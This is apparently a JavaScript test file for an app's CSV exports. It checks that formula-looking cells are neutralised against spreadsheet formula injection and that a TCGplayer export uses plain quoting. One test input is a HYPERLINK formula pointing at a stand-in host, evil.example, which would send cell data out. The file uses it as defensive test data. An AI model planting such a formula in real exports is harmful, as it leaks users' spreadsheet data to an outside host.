"use strict";
/* #163: G.csvCell, shared by every CSV export, neutralises spreadsheet
   formulas. A text cell starting with = + - @, a tab or a CR gets a leading
   ' (then the usual quoting); real numbers and text that is just a number
   stay as they are, so numeric columns still open as numbers. And
   G.parseTabularRows takes the ' back off, so a Grimoire export imports
   back unchanged. */
const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const path = require("path");
const { freshCore, freshCoreSandbox, APP_DIR } = require("../test-lib/core-shim");

const G = freshCore();

test("#163: formula-looking text gets a leading apostrophe", () => {
  assert.equal(G.csvCell("=1+1"), "'=1+1");
  assert.equal(G.csvCell("@SUM(A1)"), "'@SUM(A1)");
  assert.equal(G.csvCell("-x"), "'-x");
  assert.equal(G.csvCell("+2 Mace"), "'+2 Mace");
  assert.equal(G.csvCell("\tBin"), "'\tBin");
  // A CR is also a row break, so the cell is quoted too.
  assert.equal(G.csvCell("\rBin"), "\"'\rBin\"");
  // The audit's example: quoted because of the commas and quotes inside.
  assert.equal(G.csvCell('=HYPERLINK("https://evil.example/?"&A2,"Bin A")'),
    "\"'=HYPERLINK(\"\"https://evil.example/?\"\"&A2,\"\"Bin A\"\")\"");
});

test("#163: numbers, and text that is just a number, are left alone", () => {
  assert.equal(G.csvCell(-3), "-3");
  assert.equal(G.csvCell("-3"), "-3");
  assert.equal(G.csvCell(-1.25), "-1.25");
  assert.equal(G.csvCell("-1.25"), "-1.25");
  assert.equal(G.csvCell("+4"), "+4");
  assert.equal(G.csvCell("-.5"), "-.5");
  assert.equal(G.csvCell(0), "0");
  assert.equal(G.csvCell("12.99"), "12.99");
});

test("#163: ordinary cells are quoted exactly as before", () => {
  assert.equal(G.csvCell("a,b"), '"a,b"');
  assert.equal(G.csvCell('say "hi"'), '"say ""hi"""');
  assert.equal(G.csvCell("two\nlines"), '"two\nlines"');
  assert.equal(G.csvCell("Lightning Bolt"), "Lightning Bolt");
  assert.equal(G.csvCell("a=b"), "a=b", "only a leading = counts");
  assert.equal(G.csvCell(null), "");
  assert.equal(G.csvCell(undefined), "");
  assert.equal(G.csvCell(""), "");
});

test("#163: an exported row reads back as it was", () => {
  const row = ["@Home", "=1+1", "-x", "+2 Mace", "-3", "a,b", "Plain"];
  const csv = ["Location,Note,Other,Card Name,Qty,Pair,Name", row.map(G.csvCell).join(",")].join("\r\n");
  const parsed = G.parseTabularRows(csv);
  // Array.from: the parsed row comes from the core.js sandbox's own realm.
  assert.deepEqual(Array.from(parsed.dataRows[0], String), row);
});

/* #173: the TCGplayer export is read by TCGplayer's importer, not opened by a
   person, and every text cell in it comes from the card catalogue. It skips
   the guard (plain RFC 4180 quoting), so "+2 Mace" arrives as "+2 Mace".
   Every export meant for a spreadsheet keeps it. */
function tcgExport(cards) {
  const { G: g, sandbox } = freshCoreSandbox();
  const files = [];
  sandbox.Blob = class { constructor(parts) { this.text = parts.join(""); } };
  sandbox.URL = { createObjectURL: b => { files.push(b.text); return "blob:x"; }, revokeObjectURL() {} };
  const el = () => ({ click() {}, remove() {} });
  sandbox.document = { addEventListener() {}, createElement: el, body: { appendChild() {} } };
  for (const c of cards) g.state.cards.push(c);
  g.exportTcgCsv();
  return files[0];
}
const MACE = { id: "m1", name: "+2 Mace", setName: "Adventures in the Forgotten Realms", set: "afr", collector: "1",
  tcgplayerId: 240000, rarity: "common", condition: "NM", finish: "nonfoil", price: 0.1, quantity: 1, listedQty: 1 };

test("#173: the TCGplayer export writes card names as they are", () => {
  const csv = tcgExport([MACE, Object.assign({}, MACE, { id: "m2", name: 'Say "Hi", -x', collector: "2" })]);
  const rows = csv.split("\r\n");
  assert.equal(rows[1].split(",")[3], "+2 Mace", "no leading apostrophe");
  assert.doesNotMatch(csv, /'\+2 Mace/);
  // Quoting still follows RFC 4180.
  assert.match(rows[2], /,"Say ""Hi"", -x",/);
});

test("#173: the raw writer only quotes; the guarded one still guards", () => {
  assert.equal(G.csvRawCell("+2 Mace"), "+2 Mace");
  assert.equal(G.csvRawCell("=1+1"), "=1+1");
  assert.equal(G.csvRawCell("a,b"), '"a,b"');
  assert.equal(G.csvRawCell(null), "");
  assert.equal(G.csvCell("+2 Mace"), "'+2 Mace", "spreadsheet exports keep the guard");
  // The Inventory page's CSV export is one of those.
  const inv = fs.readFileSync(path.join(APP_DIR, "public", "inventory.page.js"), "utf8");
  const exp = inv.slice(inv.indexOf("function exportFilteredCsv"), inv.indexOf("grimoire-inventory-filtered.csv"));
  assert.match(exp, /\.map\(G\.csvCell\)/);
  assert.doesNotMatch(exp, /csvRawCell/);
});

test("#173: old exports (with the ') and new ones (without) both import as \"+2 Mace\"", () => {
  const head = "TCGplayer Id,Product Line,Set Name,Product Name";
  const oldFile = head + "\r\n240000,Magic,AFR,'+2 Mace";
  const newFile = head + "\r\n240000,Magic,AFR,+2 Mace";
  assert.equal(String(G.parseTabularRows(oldFile).dataRows[0][3]), "+2 Mace");
  assert.equal(String(G.parseTabularRows(newFile).dataRows[0][3]), "+2 Mace");
});
